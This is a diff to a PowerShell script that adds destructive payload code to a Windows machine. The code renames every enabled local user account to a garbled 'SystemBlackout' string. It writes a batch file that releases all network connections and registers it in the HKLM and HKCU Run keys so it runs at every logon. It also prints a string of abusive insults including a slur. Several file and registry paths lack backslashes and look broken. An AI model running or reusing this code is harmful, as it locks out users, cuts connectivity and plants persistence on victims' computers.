@@ -40,7 +40,7 @@ Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
 # Change the user account names
 $users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
 foreach ($user in $users) {
-    $newName = "⓿⌓⓿"
+    $newName = "S̶̞̾͑̑͋̇̔̆y̸̝̝͖̝̳̜̦͛͒̿̿̃̏̈̿͝͝ͅs̶̬̳̖̗̤͑̀͑̏̉͝t̵̛̳̟̬̯͗͊͘͘ẹ̴̒͌̈́͛̍̈́̈̂̚m̸̡̠̍̔͋̕͠⓿⌓⓿B̷̧̬̙͍͉̙̭͓͂̔̌͗̓̈̍̇̈́̕l̶̨̲͍̭͇̱͕͗͒͂̽̕̕å̷̱̖̯c̶͖͕̗͔̦̫̫̳̐̋͊̔̾͒k̸̬̏́̈͂͂̽̚͝ō̸̧͈̠̤͙̲̬͚͈̂͊̾̄̽̍̐̇ͅū̸̢̻̣̺͇̮͈ṯ̶̡̬̇́͌̎̀̉̊̉̚͠"
     Rename-LocalUser -Name $user.Name -NewName $newName
 }
 
@@ -76,6 +76,31 @@ $shortcut.Save()
 # Run the VBScript file
 $WshShell = New-Object -ComObject WScript.Shell
 $WshShell.Run($vbsFilePath)
+
+# Create batch file with custom code
+$batchScript = @"
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat
+echo ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo WORTHLESS MEANINGLESS DISGRACE USELESS WASTE PATHETIC UGLY BASTARD RETARDED LITTLE ARROGANT BRAT
+PAUSE
+"@
+
+$batchFilePath = [System.IO.Path]::Combine($videosPath, "script.bat")
+$batchScript | Out-File -FilePath $batchFilePath -Encoding ASCII
+
+# Create shortcut to the batch file in Startup folder
+$shell = New-Object -ComObject WScript.Shell
+$shortcutPath = [System.IO.Path]::Combine($videosPath, "StartupScript.lnk")
+$shortcut = $shell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $batchFilePath
+$shortcut.Save()
+
+# Run the batch file
+Start-Process -FilePath $batchFilePath
 
 $source = @"
 using System;
